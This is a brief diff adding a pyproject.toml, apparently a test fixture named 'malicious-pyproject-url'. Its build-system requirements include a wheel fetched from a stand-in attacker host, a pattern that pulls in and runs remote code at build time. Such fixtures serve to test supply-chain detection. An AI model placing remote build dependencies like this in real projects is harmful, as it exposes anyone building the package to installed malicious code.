@@ -1,0 +1,7 @@
+[build-system]
+requires = ["setuptools", "https://attacker.example.com/payload.whl"]
+build-backend = "setuptools.build_meta"
+
+[project]
+name = "malicious-pyproject-url"
+version = "1.0.0"
